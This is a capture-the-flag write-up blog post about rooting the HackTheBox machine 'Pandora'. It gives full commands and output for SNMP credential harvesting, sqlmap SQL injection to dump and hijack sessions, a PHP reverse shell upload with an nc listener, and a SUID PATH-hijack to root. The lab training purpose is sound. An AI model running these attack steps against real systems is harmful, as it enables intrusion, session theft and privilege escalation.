<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Pandora writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Summary This was quite a long but relatively straight forward easy-box. The box is centered around enumerating an snmp service, then doing some port forwarding to access a pandora web application only available on localhost. We can then exploit a SUID binary via path highjacking to gain root access. Leẗ́’s begin." /><meta property="og:description" content="Summary This was quite a long but relatively straight forward easy-box. The box is centered around enumerating an snmp service, then doing some port forwarding to access a pandora web application only available on localhost. We can then exploit a SUID binary via path highjacking to gain root access. Leẗ́’s begin." /><link rel="canonical" href="https://bitisg.github.io/posts/Pandora/" /><meta property="og:url" content="https://bitisg.github.io/posts/Pandora/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-26T15:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pandora writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-26T21:20:53+02:00","datePublished":"2022-06-26T15:00:00+02:00","description":"Summary This was quite a long but relatively straight forward easy-box. The box is centered around enumerating an snmp service, then doing some port forwarding to access a pandora web application only available on localhost. We can then exploit a SUID binary via path highjacking to gain root access. Leẗ́’s begin.","headline":"Pandora writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Pandora/"},"url":"https://bitisg.github.io/posts/Pandora/"}</script><title>Pandora writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Pandora writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/boxes/pandora/Pandora.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Pandora writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1656248400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-26 </em> </span> <span> Updated <em class="timeago" data-ts="1656271253" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-26 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1517 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was quite a long but relatively straight forward easy-box. The box is centered around enumerating an snmp service, then doing some port forwarding to access a pandora web application only available on localhost. We can then exploit a SUID binary via path highjacking to gain root access. Leẗ́’s begin.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We start out by doing an nmap port scan</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.82.187
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 19:13 CEST
Nmap scan report for 10.129.82.187
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
</span></pre></table></code></div></div><p>Based on the output the system ha 2 ports open, 22 and 80. If we check out the web application hosted on port 80 we see the following:</p><p><img data-src="/assets/img/boxes/pandora/welcome.png" alt="landing page for pandora" data-proofer-ignore> <em>Landing page for pandora</em></p><p>Enumertaing the website does not really reveal anything interesting. Instead if we also perform a port scan of UDP ports on the machine, we find that the machine is also hosting a service via UDP.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.82.187
<span class="go">[sudo] password for bitis: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 19:18 CEST
Nmap scan report for 10.129.82.187
Host is up (0.024s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT      STATE         SERVICE VERSION
68/udp    open|filtered dhcpc
</span><span class="gp">161/udp   open          snmp    SNMPv1 server;</span><span class="w"> </span>net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
<span class="c">...
</span><span class="go">38615/udp open|filtered unknown
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1308.49 seconds
</span></pre></table></code></div></div><p>If we use snmpwalk to enumerate the service we find a string which contains credentials for the <code class="language-plaintext highlighter-rouge">daniel</code> user</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.129.82.187
<span class="gp">iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #</span>102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64<span class="s2">"
</span><span class="go">iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (102912) 0:17:09.12
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
</span><span class="c">...
</span><span class="go">iso.3.6.1.2.1.25.4.2.1.5.975 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
</span><span class="gp">iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: "-c sleep 30;</span><span class="w"> </span>/bin/bash <span class="nt">-c</span> <span class="s1">'/usr/bin/host_check -u daniel -p HotelBabylon23'</span><span class="s2">"
</span><span class="go">iso.3.6.1.2.1.25.4.2.1.5.987 = ""
iso.3.6.1.2.1.25.4.2.1.5.990 = ""
iso.3.6.1.2.1.25.4.2.1.5.991 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1029 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1043 = ""
iso.3.6.1.2.1.25.4.2.1.5.1044 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1045 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1046 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1047 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1048 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1125 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1130 = STRING: "-k start"
</span><span class="c">...
</span></pre></table></code></div></div><p>We can then use the credentials <code class="language-plaintext highlighter-rouge">daniel:HotelBabylon23</code> to login as the user daniel on the machine.</p><h2 id="pivot"><span class="mr-2">Pivot</span><a href="#pivot" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>However when we login we do not see any user flag. Instead by looking at the home directory as well as taking a look at <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code> we can tell another user exists named <code class="language-plaintext highlighter-rouge">matt</code>. If we check out the apache configuration, we notice that a site with the web directory of <code class="language-plaintext filepath highlighter-rouge">/etc/www/pandora</code> exists and being served internally on port 80 of the localhost.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">daniel@pandora:/etc/apache2/sites-enabled$</span><span class="w"> </span><span class="nb">cat </span>pandora.conf 
<span class="gp">&lt;VirtualHost localhost:80&gt;</span><span class="w">
</span><span class="go">  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
</span><span class="gp">  &lt;Directory /var/www/pandora&gt;</span><span class="w">
</span><span class="go">    AllowOverride All
</span><span class="gp">  &lt;/Directory&gt;</span><span class="w">
</span><span class="go">  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</span><span class="gp">&lt;/VirtualHost&gt;</span><span class="w">
</span></pre></table></code></div></div><p>We can then use port forwarding via SSH to find out what this pandora application is all about.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>ssh <span class="nt">-L</span> 5555:127.0.0.1:80 daniel@10.129.82.187   
</pre></table></code></div></div><p><img data-src="/assets/img/boxes/pandora/pandora.png" alt="pandora landing page" data-proofer-ignore> <em>Pandora landing page</em></p><p>The landing page tells us that this application uses Pandora <code class="language-plaintext highlighter-rouge">v7.0NG.742_FIX_PERL2020</code> specifically. If we search for vulnerabilities in this version of pandora, we find <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">this</a> blogpost from sonarsource listing a few vulnerabilities. The most interesting is the unauthenticated SQL injection.</p><p>We can run SQLmap to fetch user data from the application:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://localhost:5555/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--dbms</span><span class="o">=</span>mySQL <span class="nt">--tables</span>
<span class="c">...
</span><span class="go">Database: pandora
[178 tables]
+---------------------------------------+
| taddress                              |
| taddress_agent                        |
| tagent_access                         |
| tagent_custom_data                    |
| tagent_custom_fields                  |
---SNIP---
| tsesion                               |
| tsesion_extended                      |
| tsessions_php                         |
| tskin                                 |
| tsnmp_filter                          |
| tvisual_console_elements_cache        |
| twidget                               |
| twidget_dashboard                     |
+---------------------------------------+
</span></pre></table></code></div></div><p>We can then dump the <code class="language-plaintext highlighter-rouge">tsessions_php</code> table to steal a session from an authenticated user.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://localhost:5555/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--dbms</span><span class="o">=</span>mySQL <span class="nt">--dump</span> <span class="nt">-T</span> <span class="s2">"tsessions_php"</span>
<span class="go">
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
</span><span class="gp">| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";</span><span class="w">                            </span>| 1638783555  |
<span class="go">---SNIP---
</span><span class="gp">| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:"daniel";</span><span class="w">                            </span>| 1641201982  |
<span class="go">| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
</span><span class="gp">| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";</span><span class="w">                            </span>| 1638783230  |
<span class="gp">| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";</span>alert_msg|a:0:<span class="o">{}</span>new_chat|b:0<span class="p">;</span> | 1638796349  |
<span class="go">| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
</span><span class="gp">| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";</span><span class="w">                            </span>| 163816849   |
</pre></table></code></div></div><p>Based on the dump we can steal the session from the <code class="language-plaintext highlighter-rouge">matt</code> user by appending it to the url as the value of the <code class="language-plaintext highlighter-rouge">session_id</code> variable. Once this is done we see the dashboard of the <code class="language-plaintext highlighter-rouge">matt</code> user.</p><p><img data-src="/assets/img/boxes/pandora/dashboard.png" alt="pandora dashboard" data-proofer-ignore></p><p>Looking at the blogpost from earlier, we learn of a RCE vulnerability which exists for authenticated users in Pandora via the <code class="language-plaintext highlighter-rouge">events</code> feature. Another option is to use the POC found <a href="https://github.com/zjicmDarkWing/CVE-2021-32099">here</a>. This POC gives us admin rights in the dasboard. We can then upload a file to the system which is a php reverse shell.</p><p><img data-src="/assets/img/boxes/pandora/upload.png" alt="upload" data-proofer-ignore></p><p>We can then access the <code class="language-plaintext highlighter-rouge">/images</code> directory, find our shell and gain access to the system:</p><p><img data-src="/assets/img/boxes/pandora/images.png" alt="images" data-proofer-ignore></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 1337
<span class="go">listening on [any] 1337 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.82.187] 53232
</span><span class="gp">Linux pandora 5.4.0-91-generic #</span>102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
<span class="go"> 18:44:49 up  1:33,  1 user,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/1    10.10.17.182     18:00   44:29   0.03s  0.03s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/matt
<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we have user access to the system we need to gain access to the root user. We start out by finding SUID binaries:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
<span class="go">/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
</span><span class="gp">$</span><span class="w"> 
</span></pre></table></code></div></div><p>Two binaries stand out. The first is <a href="https://gtfobins.github.io/gtfobins/at/#shell">at</a>, which we can use to break out of restricted environments. The second is <code class="language-plaintext filepath highlighter-rouge">/usr/bin/pandora_backup</code>. After using <code class="language-plaintext highlighter-rouge">at</code>, we can take a further look at the backup binary.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="gp">matt@pandora:/$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"/bin/sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">"</span> | at now<span class="p">;</span> <span class="nb">tail</span> <span class="nt">-f</span> /dev/null
<span class="gp">&lt;(tty) &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span> 2&gt;<span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">" | at now; tail -f /dev/null
</span><span class="go">warning: commands will be executed using /bin/sh
job 3 at Sun Jun 26 19:00:00 2022
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
</span><span class="gp">$</span><span class="w">
</span></pre></table></code></div></div><p>Running <code class="language-plaintext highlighter-rouge">strings</code> on the binary reveals that it is using the relative and not the absolute path, which means we can perform path highjacking to gain root.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]
</span><span class="gp">└─$</span><span class="w"> </span>strings pandora_backup          
<span class="go">/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
</span></pre></table></code></div></div><p>To do this, we simply create our own file called tar, with whatever commands we want.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"/bin/bash -p"</span> <span class="o">&gt;</span> <span class="nb">tar</span>
<span class="gp">echo "/bin/bash -p" &gt;</span><span class="w"> </span><span class="nb">tar</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="nb">tar</span>
<span class="go">chmod +x tar
</span><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="gp">export PATH=/tmp:$</span>PATH
<span class="gp">$</span><span class="w"> </span>/usr/bin/pandora_backup
<span class="go">/usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
bash: cannot set terminal process group (973): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@pandora:/tmp#</span><span class="w"> 
</span></pre></table></code></div></div><p>Rooted! The reason this works is that by creating our own tar file, and adding the folder it resides in to the front of our path variable, is that when the system calls path without the absolute path, it finds the path via the path variable. It looks in each folder in the variable and calls the first file named tar it finds, which in this case was our malicious file.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/easy-box/" class="post-tag no-text-decoration" >Easy-box</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pandora writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Pandora/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pandora writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Pandora/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Pandora/&amp;text=Pandora writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 